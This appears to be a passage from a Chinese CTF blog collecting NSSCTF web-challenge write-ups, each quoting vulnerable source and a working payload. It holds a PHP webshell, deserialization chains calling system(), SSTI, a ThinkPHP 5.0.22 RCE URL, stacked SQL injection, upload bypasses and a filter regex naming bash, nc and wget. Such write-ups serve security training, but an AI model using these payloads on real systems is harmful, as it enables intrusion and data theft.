+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])\n\njsfuck解码\nNSSCTF&#123;0ed61f00-c99f-4215-a38e-4fdf7feeae5c&#125;\n\n[LitCTF 2023]作业管理系统弱口令admin&#x2F;admin登录成功,有个上传文件的地点上传1.php,蚁剑链接即可\n\nNSSCTF&#123;87d35619-3607-475a-b784-5de88f37f2d8&#125;\n\n[SWPUCTF 2021 ]pop&lt;?phperror_reporting(0);show_source(&quot;index.php&quot;);class w44m&#123;    private $admin = &#x27;aaa&#x27;;    protected $passwd = &#x27;123456&#x27;;    public function Getflag()&#123;        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;else&#123;            echo $this-&gt;admin;            echo $this-&gt;passwd;            echo &#x27;nono&#x27;;        &#125;    &#125;&#125;class w22m&#123;    public $w00m;    public function __destruct()&#123;        echo $this-&gt;w00m;    &#125;&#125;class w33m&#123;    public $w00m;    public $w22m;    public function __toString()&#123;        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();        return 0;    &#125;&#125;$w00m = $_GET[&#x27;w00m&#x27;];unserialize($w00m);\n\nw22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()\n\n&lt;?phpclass w44m&#123;    private $admin = &#x27;w44m&#x27;;    protected $passwd = &#x27;08067&#x27;;&#125;class w22m&#123;    public $w00m;&#125;class w33m&#123;    public $w00m;    public $w22m;&#125;# w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()$a = new w22m();echo urlencode(serialize($a));?&gt;\n\n\nNSSCTF&#123;fb43f7ba-ac7b-4398-ac41-78c0c4b91e55&#125;\n\n[鹏城杯 2022]简单包含&lt;?phphighlight_file(__FILE__);include($_POST[&quot;flag&quot;]);//flag in /var/www/html/flag.php;?&gt;\n\n文件包含,但是有waf,添加脏数据即可绕过\n1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/read=convert.base64-encode/resource=flag.php\n\n得到的字符串base64解码即可\n\nNSSCTF&#123;898bdef2-4464-46c4-a33d-16f3ec2fb907&#125;\n\n[SWPUCTF 2021 ]finalrce&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123;    $url=$_GET[&#x27;url&#x27;];    if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url))    &#123;        echo &quot;Sorry,you can&#x27;t use this.&quot;;    &#125;    else    &#123;        echo &quot;Can you see anything?&quot;;        exec($url);    &#125;&#125;\n\n无回显rce,dns外带,反弹shell都不行,但是没有过滤tee命令,ls被过滤,用l’’s即可绕过\n?url=l&#x27;&#x27;s /|tee 1.txt 访问1.txt即可\n\n\n不知道哪个是真的,都试试\n?url=tac /a_here_is_a_f1ag|tee 2.txt\n\n\n?url=tac /flllllaaaaaaggggggg|tee 3.txt\n\n发现la被过滤,也用l’’a过滤即可\n?url=tac /flllll&#x27;&#x27;aaaaaaggggggg|tee 3.txt\n\n\nNSSCTF&#123;dce5fd0e-5c6f-4cf5-bee1-a7e92a9a2f39&#125;\n\n[SWPUCTF 2021 ]sql\nfuzz一下,过滤了空格和等号,空格用&#x2F;**&#x2F;,等号用like,sqlmap一把梭\npython sqlmap.py -u http://node4.anna.nssctf.cn:28905/?wllm=1 --tamper=space2comment,equaltolike --batch --tablesNSSCTF&#123;c102c917-6b0c-46f0-9b5f-85cb84c46e86&#125;\n\n[HNCTF 2022 Week1]Interesting_includehttp://node5.anna.nssctf.cn:23362/?filter=php://filter/read=convert.base64-encode/resource=flag.php\n\n\nNSSCTF&#123;fd4469d9-cb38-4626-be18-66249511c7eb&#125;\n\n[NSSCTF 2022 Spring Recruit]babyphp&lt;?phphighlight_file(__FILE__);include_once(&#x27;flag.php&#x27;);if(isset($_POST[&#x27;a&#x27;])&amp;&amp;!preg_match(&#x27;/[0-9]/&#x27;,$_POST[&#x27;a&#x27;])&amp;&amp;intval($_POST[&#x27;a&#x27;]))&#123;    if(isset($_POST[&#x27;b1&#x27;])&amp;&amp;$_POST[&#x27;b2&#x27;])&#123;        if($_POST[&#x27;b1&#x27;]!=$_POST[&#x27;b2&#x27;]&amp;&amp;md5($_POST[&#x27;b1&#x27;])===md5($_POST[&#x27;b2&#x27;]))&#123;            if($_POST[&#x27;c1&#x27;]!=$_POST[&#x27;c2&#x27;]&amp;&amp;is_string($_POST[&#x27;c1&#x27;])&amp;&amp;is_string($_POST[&#x27;c2&#x27;])&amp;&amp;md5($_POST[&#x27;c1&#x27;])==md5($_POST[&#x27;c2&#x27;]))&#123;                echo $flag;            &#125;else&#123;                echo &quot;yee&quot;;            &#125;        &#125;else&#123;            echo &quot;nop&quot;;        &#125;    &#125;else&#123;        echo &quot;go on&quot;;    &#125;&#125;else&#123;    echo &quot;let&#x27;s get some php&quot;;&#125;?&gt;\n\nintval不能转换数组,会返回1或者0,具体看数组是否为空a[]=1&amp;b1[]=1&amp;b2[]=2&amp;c1=240610708&amp;c2=QNKCDZO\n\n\nNSSCTF&#123;5fc91657-8e8c-4dbd-b42e-897518cdcdb6&#125;\n\n[LitCTF 2023]Vim yyds\n打开swp文件\nvim -r index.php.swp\n\n&lt;?phperror_reporting(0);$password = &quot;Give_Me_Your_Flag&quot;;echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;if ($_POST[&#x27;password&#x27;] == base64_encode($password)) &#123;    echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;    eval(system($_POST[&#x27;cmd&#x27;])&#125;?&gt;\n\n\nNSSCTF&#123;cffb4191-06eb-419c-8b2d-6c9dd0e7f7ed&#125;\n\n[鹤城杯 2021]EasyP&lt;?phpinclude &#x27;utils.php&#x27;;if (isset($_POST[&#x27;guess&#x27;])) &#123;    $guess = (string) $_POST[&#x27;guess&#x27;];    if ($guess === $secret) &#123;        $message = &#x27;Congratulations! The flag is: &#x27; . $flag;    &#125; else &#123;        $message = &#x27;Wrong. Try Again&#x27;;    &#125;&#125;if (preg_match(&#x27;/utils\\.php\\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;    exit(&quot;hacker :)&quot;);&#125;if (preg_match(&#x27;/show_source/&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123;    exit(&quot;hacker :)&quot;);&#125;if (isset($_GET[&#x27;show_source&#x27;])) &#123;    highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));    exit();&#125;else&#123;    show_source(__FILE__);&#125;?&gt; \n\n案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root$_SERVER[&#x27;PHP_SELF&#x27;] \t得到：/php/index.php/test/foo$_SERVER[&#x27;REQUEST_URI&#x27;] 得到：/php/index.php/test/foo?username=root\n\n/index.php/utils.php/%a0?show+source=1%a0 是 URL 编码中的一个特殊字符，代表一个非打印字符（No-Break Space）。在 PHP 中，非打印字符通常会被忽略。所以，/utils.php/%a0 实际上被 PHP 解析为 /utils.php/show_source绕过:用+绕过,因为变量名有+会被替换为_\n\n\nNSSCTF&#123;692b6db9-26ae-4800-89a2-e0df6bf675f0&#125;\n\n[SWPUCTF 2022 ]ez_ez_php(revenge)&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;        echo &quot;Nice!!!&quot;;        include($_GET[&quot;file&quot;]);    &#125;     else &#123;        echo &quot;Hacker!!&quot;;    &#125;&#125;else &#123;    highlight_file(__FILE__);&#125;\n\n?file=php://filter/read=convert.base64-encode/resource=flag.php\n\n&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);echo   &quot;NSSCTF&#123;flag_is_not_here&#125;&quot; .&quot;&lt;br/&gt;&quot;;echo &quot;real_flag_is_in_ &#x27;/flag&#x27; &quot;.&quot;&lt;br/&gt;&quot;;echo &quot;换个思路，试试PHP伪协议呢&quot;;\n\n?file=php://filter/read=convert.base64-encode/resource=/flag\n\n\nNSSCTF&#123;314f54d0-a0be-4756-a49b-3ae5c1ce851c&#125;\n\n[HUBUCTF 2022 ]checkin&lt;?phpshow_source(__FILE__);$username  = &quot;this_is_secret&quot;; $password  = &quot;this_is_not_known_to_you&quot;; include(&quot;flag.php&quot;);//here I changed those two $info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;$data_unserialize = unserialize($info);if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;    echo $flag;&#125;else&#123;    echo &quot;username or password error!&quot;;&#125;?&gt;\n\n弱比较即可,true和什么比较都是真的\n?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;\n\n\nNSSCTF&#123;57defded-2363-4440-b19e-e78ea1b25589&#125;\n\n[CISCN 2019华东南]Web11\nsmarty的ssti,改xff即可\n\n\n&#123;&#123;system(&#x27;tac /f*&#x27;)&#125;&#125;\n\nflag在f12里才能看得到\n\nNSSCTF&#123;41a64a71-607f-4160-99ee-56cdbbcb7dba&#125;\n\n[GDOUCTF 2023]EZ WEBctrl+u得到提示&#x2F;src\nimport flaskapp = flask.Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def index():  return flask.send_file(&#x27;index.html&#x27;)@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])def source():  return flask.send_file(&#x27;app.py&#x27;)@app.route(&#x27;/super-secret-route-nobody-will-guess&#x27;, methods=[&#x27;PUT&#x27;])def flag():  return open(&#x27;flag&#x27;).read()\n\n用PUT方法访问&#x2F;super-secret-route-nobody-will-guess\n\nNSSCTF&#123;8da126ae-6484-4e9e-a89a-9346d6e25c2b&#125;\n\n[GDOUCTF 2023]泄露的伪装dirsearch扫描到test.txt和www.rar\n&lt;?phperror_reporting(0);if(isset($_GET[&#x27;cxk&#x27;]))&#123;    $cxk=$_GET[&#x27;cxk&#x27;];    if(file_get_contents($cxk)==&quot;ctrl&quot;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;娲楁礂鐫″惂&quot;;    &#125;&#125;else&#123;    echo &quot;nononoononoonono&quot;;&#125;?&gt;\n\nwww.rar:\n恭喜你turn to/orzorz.php\n\n\nNSSCTF&#123;5dd848cd-187f-406f-bfd9-0b67a13c39da&#125;\n\n[UUCTF 2022 ]ez_rceif(isset($_GET[&#x27;code&#x27;]))&#123;    $code=$_GET[&#x27;code&#x27;];    if (!preg_match(&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;,$code))&#123;        echo &#x27;看看你输入的参数！！！不叫样子！！&#x27;;echo &#x27;&lt;br&gt;&#x27;;        eval($code);    &#125;    else&#123;        die(&quot;你想干什么？？？？？？？？？&quot;);    &#125;&#125;else&#123;    echo &quot;居然都不输入参数，可恶!!!!!!!!!&quot;;    show_source(__FILE__);&#125;\n\n没过滤反引号,还需要有个回显函数,print_r\n?code=print_r(`l\\s /`);bin boot dev etc fffffffffflagafag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var?code=print(`c\\at%09/fffffffffflagafag`);NSSCTF&#123;This_IS_s0_easy_RCE&#125;\n\n\n[LitCTF 2023]这是什么？SQL ！注一下 ！$sql = &quot;SELECT username,password FROM users WHERE id = &quot;.&#x27;((((((&#x27;.$_GET[&quot;id&quot;].&#x27;))))))&#x27;;$result = $conn-&gt;query($sql);\n\n六个括号\n库:?id=-1)))))) union select schema_name,2 from information_schema.schemata--+Array ( [0] =&gt; Array ( [username] =&gt; information_schema [password] =&gt; 2 ) [1] =&gt; Array ( [username] =&gt; mysql [password] =&gt; 2 ) [2] =&gt; Array ( [username] =&gt; ctftraining [password] =&gt; 2 ) [3] =&gt; Array ( [username] =&gt; performance_schema [password] =&gt; 2 ) [4] =&gt; Array ( [username] =&gt; test [password] =&gt; 2 ) [5] =&gt; Array ( [username] =&gt; ctf [password] =&gt; 2 ) )猜测是ctftraining库?id=-1)))))) union select table_name,2 from information_schema.tables where table_schema=&#x27;ctftraining&#x27;--+Array ( [0] =&gt; Array ( [username] =&gt; flag [password] =&gt; 2 ) [1] =&gt; Array ( [username] =&gt; news [password] =&gt; 2 ) [2] =&gt; Array ( [username] =&gt; users [password] =&gt; 2 ) )查字段:?id=-1)))))) union select flag,2 from ctftraining.flag--+\n\n\nNSSCTF&#123;60b9f165-1f1d-43af-8074-2d33cad25413&#125; \n\n[HNCTF 2022 Week1]2048findsomething找到有2048.js\n\n把alert那一串放到控制台即可\n\nflag&#123;53160c888e25c3f828b23e316a7ae083&#125;\n\n[SWPUCTF 2022 ]1z_unserialize&lt;?php class lyh&#123;    public $url = &#x27;NSSCTF.com&#x27;;    public $lt;    public $lly;          function  __destruct()     &#123;        $a = $this-&gt;lt;        $a($this-&gt;lly);     &#125;        &#125;unserialize($_POST[&#x27;nss&#x27;]);highlight_file(__FILE__);\n\n&lt;?phpclass lyh&#123;    public $url = &#x27;NSSCTF.com&#x27;;    public $lt = &#x27;system&#x27;;    public $lly=&#x27;ls /&#x27;;          function  __destruct()     &#123;        $a = $this-&gt;lt;        $a($this-&gt;lly);     &#125;&#125;$a = new lyh();echo urlencode(serialize($a));?&gt;O%3A3%3A%22lyh%22%3A3%3A%7Bs%3A3%3A%22url%22%3Bs%3A10%3A%22NSSCTF.com%22%3Bs%3A2%3A%22lt%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22lly%22%3Bs%3A4%3A%22ls+%2F%22%3B%7D\n\n\n\nNSSCTF&#123;943c6300-969a-4972-b9e5-bca0ffb94bfb&#125; \n\n[SWPUCTF 2022 ]奇妙的MD5抓包,头部有提示\n\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\n用万能密码ffifdyop绕过\n第二关\n$x= $GET[&#x27;x&#x27;];$y = $_GET[&#x27;y&#x27;];if($x != $y &amp;&amp; md5($x) == md5($y))&#123;;\n\n?x=QNKCDZO&amp;y=240610708\n\n第三关\n&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;wqh&#x27;]!==$_POST[&#x27;dsy&#x27;]&amp;&amp;md5($_POST[&#x27;wqh&#x27;])===md5($_POST[&#x27;dsy&#x27;]))&#123;    echo $FLAG;&#125;\n\nphp的md5函数不能处理数组,会返回false\nwqh[]=1&amp;dsy[]=2\n\n\nNSSCTF&#123;4c6ee843-f49a-44b5-9f96-7a6222519aea&#125;\n\n[SWPUCTF 2022 ]ez_ez_unserialize&lt;?phpclass X&#123;    public $x = __FILE__;    function __construct($x)    &#123;        $this-&gt;x = $x;    &#125;    function __wakeup()    &#123;        if ($this-&gt;x !== __FILE__) &#123;            $this-&gt;x = __FILE__;        &#125;    &#125;    function __destruct()    &#123;        highlight_file($this-&gt;x);        //flag is in fllllllag.php    &#125;&#125;if (isset($_REQUEST[&#x27;x&#x27;])) &#123;    @unserialize($_REQUEST[&#x27;x&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n绕过__wakeup只要改一下序列化字符串中对象属性的个数即可(PHP&#x2F;5.5.38)\n&lt;?phpclass X&#123;    public $x = &#x27;fllllllag.php&#x27;;    function __construct($x)    &#123;        $this-&gt;x = $x;    &#125;    function __wakeup()    &#123;        if ($this-&gt;x !== __FILE__) &#123;            $this-&gt;x = __FILE__;        &#125;    &#125;    function __destruct()    &#123;        highlight_file($this-&gt;x);        //flag is in fllllllag.php    &#125;&#125;echo serialize(new X(&#x27;fllllllag.php&#x27;));O:1:&quot;X&quot;:1:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;O:1:&quot;X&quot;:2:&#123;s:1:&quot;x&quot;;s:13:&quot;fllllllag.php&quot;;&#125;//payload\n\n\nNSSCTF&#123;0b3111b4-8e75-4772-8d53-01b939ae699b&#125;\n\n[GKCTF 2020]cve版签到点开按钮,抓包\n\nflag in localhost,ssrf,%00截断字符串\n?url=127.0.0.1%00.ctfhub.com\n\n\n?url=http://127.0.0.123%00www.ctfhub.com\n\n\nNSSCTF&#123;cc6dc12c-070b-4bfd-b475-ab40e6b1de81&#125;\n\n[羊城杯 2020]easycon\n\ncat 这个文件,把回显的baase64字符串转为图片\n\n\nNSSCTF&#123;do_U_kn0W_c@idao&#125;\n\n[MoeCTF 2022]baby_file&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n?file=php://filter/read=convert.base64-encode/resource=flag.phpNSSCTF&#123;0790ba2e-76a6-4722-bb29-bcbdebc2e264&#125;\n\n[HNCTF 2022 Week1]easy_htmlcookie中提示flag在.%2Ff14g.php,访问,抓包,输入长一点的数字即可\n\nNSSCTF&#123;03aa8e85-b49a-4017-9663-f64df90b5991&#125;\n\n[GDOUCTF 2023]受不了一点&lt;?phperror_reporting(0);header(&quot;Content-type:text/html;charset=utf-8&quot;);if(isset($_POST[&#x27;gdou&#x27;])&amp;&amp;isset($_POST[&#x27;ctf&#x27;]))&#123;    $b=$_POST[&#x27;ctf&#x27;];    $a=$_POST[&#x27;gdou&#x27;];    if($_POST[&#x27;gdou&#x27;]!=$_POST[&#x27;ctf&#x27;] &amp;&amp; md5($a)===md5($b))&#123;        if(isset($_COOKIE[&#x27;cookie&#x27;]))&#123;           if ($_COOKIE[&#x27;cookie&#x27;]==&#x27;j0k3r&#x27;)&#123;               if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; isset($_GET[&#x27;bbb&#x27;]))&#123;                  $aaa=$_GET[&#x27;aaa&#x27;];                  $bbb=$_GET[&#x27;bbb&#x27;];                 if($aaa==114514 &amp;&amp; $bbb==114514 &amp;&amp; $aaa!=$bbb)&#123;                   $give = &#x27;cancanwordflag&#x27;;                   $get =&#x27;hacker!&#x27;;                   if(isset($_GET[&#x27;flag&#x27;]) &amp;&amp; isset($_POST[&#x27;flag&#x27;]))&#123;                         die($give);                    &#125;                   if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27; || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;                       die($get);                    &#125;                    foreach ($_POST as $key =&gt; $value) &#123;                        $$key = $value;                   &#125;                    foreach ($_GET as $key =&gt; $value) &#123;                         $$key = $$value;                    &#125;                   echo $flag;            &#125;else&#123;                  echo &quot;洗洗睡吧&quot;;                 &#125;    &#125;else&#123;        echo &quot;行不行啊细狗&quot;;        &#125;  &#125;&#125;?&gt;\n\n\nNSSCTF&#123;629b2eb2-d6d9-459e-b8fb-c066b6f6defe&#125;\n\n[HCTF 2018]Warmup&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#x27;t see it&quot;;                return false;            &#125;            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)            );            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            echo &quot;you can&#x27;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#x27;file&#x27;])        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])    ) &#123;        include $_REQUEST[&#x27;file&#x27;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;;    &#125;  ?&gt;hint.php:flag is in ffffllllaaaagggg\n\n有个in_array函数,传进来的需要有白名单里的字符串\n$_page = mb_substr(                $page,                0,                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)            );mb_strpos函数:  查找字符串在另一个字符串中首次出现的位置 mb_strpos ($haystack , $needle , $offset )$haystack：被搜索的字符串$needle：  要查找的字符串$offset：  可选参数,指定从哪个字符开始搜索//如果为正数,则从字符串的开头开始计算;如果是负数,则从字符串的末尾开始计算//没有的话默认是0,即从开头开始搜索 mb_substr函数:  从一个字符串中提取子字符串 mb_substr ($str , $start , $length )//substr() 函数只针对英文字符,而mb_substr()对于中文也适用$str：    原始字符串$start：  起始位置,如果为正数,则从字符串的开头开始计算;如果是负数,则从字符串的末尾开始计算$length： 可选参数,表示要提取的子字符串的长度,如果没赋值,则提取从开始到字符串结束的所有字符        首先使用mb_strpos函数找到$page中第一个问号的位置,然后使用mb_substr函数将问号之前的部分赋值作为$_page进行处理经过mb_strpos和mb_substr函数得到的$_page如果在白名单中,返回true,所以传的东西一定要包含?且问号之前的字符串一定得是白名单里的字符串\n\n\nNSSCTF&#123;bce812f5-84d0-4b36-bbe1-62dfe79ec0d5&#125;\n\n[HNCTF 2022 Week1]What is Web\nNSSCTF&#123;Hell0_Weber_Wec0m3_come_2_web_w0r1d!&#125;\n\n这题也配20金币?\n[HNCTF 2022 Week1]Interesting_httpPOST / HTTP/1.1Host: node5.anna.nssctf.cn:20139Cache-Control: max-age=0Accept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 9Cookie: user=adminx-forwarded-for:127.0.0.1want=flag\n\n\nNSSCTF&#123;5dfb4e40-3a07-4c95-8ef7-fad0817e6d6f&#125;\n\n[SWPUCTF 2022 ]where_am_i\n搜酒店号码,02886112888\n\nNSSCTF&#123;768c51d0-ab7f-441b-81c2-8d51bf5bbd55&#125;\n\n[SWPUCTF 2022 ]ez_rcethinkphp5.0.22 rce payload:\nhttp://node7.anna.nssctf.cn:26494/NSS/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls / \n\n\n找flag位置,不在&#x2F;flag\nfind / -type f -exec grep -l &quot;NSSCTF&quot; &#123;&#125; \\;\n\n在&#x2F;nss&#x2F;ctf&#x2F;flag&#x2F;flag\n\nNSSCTF&#123;26719f97-fff1-4d12-80db-cc40a6ab7d62&#125;\n\n[GXYCTF 2019]BabyUpload上传.htaccess,改mime为image&#x2F;jpeg,然后传马\nGIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[1]);&lt;/script&gt;\n\n\nNSSCTF&#123;dc37e82d-43c6-469a-98cb-8b2919966102&#125;\n\n[SWPUCTF 2022 ]xff[HNCTF 2022 Week1]easy_upload传马,改mime\n\nNSSCTF&#123;d8f3b55b-0443-40bf-bc9b-9bbfc6be208b&#125;\n\n[HNCTF 2022 WEEK2]ez_SSTI参数是name\n利用字符串类-&gt;基类-&gt;所有python子类-&gt;get_data方法读取flag\n?name=&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[118][&quot;get_data&quot;](0,&quot;flag&quot;)&#125;&#125;.\n\n\nNSSCTF&#123;78ca93c4-c65d-4030-8557-6f56fe5fcd91&#125;\n\n[SWPUCTF 2022 ]js_signfindsomething得到存在main.js文件,访问\ndocument.getElementsByTagName(&quot;button&quot;)[0].addEventListener(&quot;click&quot;, ()=&gt;&#123;    flag=&quot;33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15&quot;    if (btoa(flag.value) == &#x27;dGFwY29kZQ==&#x27;) &#123;        alert(&quot;you got hint!!!&quot;);    &#125; else &#123;        alert(&quot;fuck off !!&quot;);    &#125;    &#125;)dGFwY29kZQ==  即tap code把flag用tapcode变换得到flag\n\n\nNSSCTF&#123;youfindflagbytapcode&#125;\n\n[强网杯 2019]随便注?inject=1&#x27;;show+tables;%23   words 191981093114514?inject=1&#x27;;show+columns+from+words;%23?inject=1&#x27;;show+columns+from+`1919810931114514`;%23\n\n\n\n通过观察 words表单有两列, 也就是上面的 1 和 hahahah我们可以推测 这个表单其实是从words表中以id字段为索引获取到内容 然后返回到前台并且后台的查询语句为&quot;select * from words where id=&#39;&quot;.$_GET[&#39;inject&#39;].&quot;&#39;&quot;\n那么 我们是不是可以通过修改带flag字段的表的名字为words表 然后把flag 字段修改为id通过三条alter语句来修改\n\n修改words表名为其他的\nalter table words rename words1;\n\n\n修改1919810931114514表名为words\nalter table 1919810931114514 rename words;\n\n\n修改新的words表中的flag列名为id\nalter table words change flag id varchar(60);得到最终payload 1&#39;;alter table words rename words1;alter table 1919810931114514 rename words;alter table words change flag id varchar(60);#\n\n\n\n发现没结果了, 原因是新的id列中的值已经变为flag值了 所以查询inject&#x3D;1查不到我们可以通过让where条件永远为正查出来所有数据构造payload1&#39; or &#39;1&#39;=&#39;1获取到flag值\n\nNSSCTF&#123;9c8b2625-1334-448a-86d1-f9a26c72ccb7&#125;\n\n[HDCTF 2023]SearchMasterdirsearch扫描到composer.json文件\n\n&#123;    &quot;name&quot;: &quot;smarty/smarty&quot;,    &quot;type&quot;: &quot;library&quot;,    &quot;description&quot;: &quot;Smarty - the compiling PHP template engine&quot;,    &quot;keywords&quot;: [        &quot;templating&quot;    ],    &quot;homepage&quot;: &quot;https://smarty-php.github.io/smarty/&quot;,    &quot;license&quot;: &quot;LGPL-3.0&quot;,    &quot;authors&quot;: [        &#123;            &quot;name&quot;: &quot;Monte Ohrt&quot;,            &quot;email&quot;: &quot;monte@ohrt.com&quot;        &#125;,        &#123;            &quot;name&quot;: 